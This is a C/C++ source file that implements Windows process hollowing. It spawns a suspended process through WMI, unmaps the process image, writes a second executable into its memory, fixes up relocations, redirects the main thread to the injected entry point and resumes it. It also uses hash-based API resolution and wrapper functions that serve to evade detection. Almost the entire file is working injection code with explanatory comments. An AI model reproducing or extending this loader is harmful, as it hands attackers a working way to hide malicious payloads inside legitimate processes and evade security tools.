#include <windows.h>
#include "pe.h"
#include "initialize_wmi.h"
#include "ph_function_defenition.h"


#pragma warning(disable : 4996)


// Here's a high-level overview of what the code does:

// It initializes the Windows Management Instrumentation (WMI) service and creates a new process using the CreateProcess_API() function. The new process is created in a suspended state.

// It opens a handle to the newly created process and its main thread using the OpenProcess_engine() and OpenThread_engine() functions.

// It reads the Process Environment Block (PEB) of the new process and the image of the executable file that will be injected into the new process.

// It unmaps the memory of the original executable file from the new process using the NtUnmapViewOfSection function.

// It allocates new memory in the new process for the executable file to be injected.

// It writes the headers and sections of the executable file to be injected into the newly allocated memory in the new process.

// If the base address of the injected image is different from the base address of the original image, it processes the relocation entries of the injected image to adjust for the base address difference.

// It sets a breakpoint at the entry point of the injected image (optional, controlled by the WRITE_BP macro).

// It updates the context of the main thread of the new process to set the instruction pointer to the entry point of the injected image.

// It resumes the main thread of the new process, causing it to start executing the injected image.

// Finally, it closes the handle to the executable file.
void CreateHollowedProcess()
{
	DWORD pid = 0, tid = 0;
	// Initialize the Windows Management Instrumentation (WMI) service
	INT initialized1 = wmi_initialize(_bstr_t("ROOT\\CIMV2")); 
	
	if(initialized1)
	{
		// Create a new process in a suspended state
		pid = CreateProcess_API(); 
		// Get the thread ID of the new process
		tid = get_threadID(pid);
		pSvc->Release();
		pLoc->Release();
		pCoUninitialize();
	}
	
	// Open a handle to the new process
	hProcess = OpenProcess_engine(pid); 

	// Read the Process Environment Block (PEB) of the new process
	pPEB = (PPEB)ReadRemotePEB();

	// reading memory of the just opened process - we will not be using it
	PLOADED_IMAGE pImage = ReadRemoteImage();

	// Open a handle to the main thread of the new process
	HANDLE hThread = OpenThread_engine(tid);

	// Create a handle to the executable file to be injected
	// WHAT is WRONG it just calles create file with 0 0 0 0 and I think it opens the current process
	// very confusing
	HANDLE hFile = CreateFileA_engine();

	
	if (hFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return;
	}

	// Read the executable file into a buffer
	PBYTE pBuffer = ReadFile_engine(hFile); 

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

	// Get the headers of the executable file
	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)_initialize(djb2_values[0], (LPCSTR)"NtUnmapViewOfSection",0);

	// Unmap the memory of the original executable file from the new process
	DWORD dwResult = NtUnmapViewOfSection
	(
		hProcess,
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		return;
	}

	// Allocate new memory in the new process for the executable file to be injected
	PVOID pRemoteImage = VirtualAllocEx_engine(pSourceHeaders->OptionalHeader.SizeOfImage);
	
	if (!pRemoteImage)
	{
		return;
	}
	
	// Calculate the difference between the base address of the injected image and the base address of the original image
	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
		pSourceHeaders->OptionalHeader.ImageBase;

	// Set the base address of the injected image to the base address of the original image
	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

	// Write the headers of the injected image into the newly allocated memory in the new process
	if (!WriteProcessMemory_engine(0x0, pPEB->ImageBaseAddress,pBuffer, pSourceHeaders->OptionalHeader.SizeOfHeaders,0x0))
	{
		return;
	}
	
	// Write the sections of the injected image into the newly allocated memory in the new process
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination =
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		if (!WriteProcessMemory_engine(0x0, pSectionDestination, &pBuffer[pSourceImage->Sections[x].PointerToRawData], pSourceImage->Sections[x].SizeOfRawData, 0x0))
		{
			return;
		}
	}
	
	// If the base address of the injected image is different from the base address of the original image, process the relocation entries of the injected image
	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = (char*)".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData =
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader =
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks =
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					dwBuffer = ReadProcessMemory_engine((PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress));

					dwBuffer += dwDelta;
					
					BOOL bSuccess = WriteProcessMemory_engine(0x0, (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress), &dwBuffer, sizeof(DWORD), 0x0);

					if (!bSuccess)
					{
						continue;
					}
				}
			}

			break;
		}

	// Set a breakpoint at the entry point of the injected image (optional)
	DWORD dwBreakpoint = 0xCC;

	DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
		pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
	
	if (!WriteProcessMemory
	(
		hProcess,
		(PVOID)dwEntrypoint,
		&dwBreakpoint,
		4,
		0
	))
	{
		return;
	}
#endif
	
	// Update the context of the main thread of the new process to set the instruction pointer to the entry point of the injected image
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;

	if (!pGetThreadContext(hThread, pContext))
	{
		return;
	}

	pContext->Eax = dwEntrypoint;

	if (!pSetThreadContext(hThread, pContext))
	{
		return;
	}

	// Resume the main thread of the new process, causing it to start executing the injected image
	if (!pResumeThread(hThread)) 
	{
		return;
	}

	// Close the handle to the executable file (which actually is our own memory)
	CloseHandle(hFile);
}

VOID WINAPI ph(VOID)
{
	
	CreateHollowedProcess();
	
}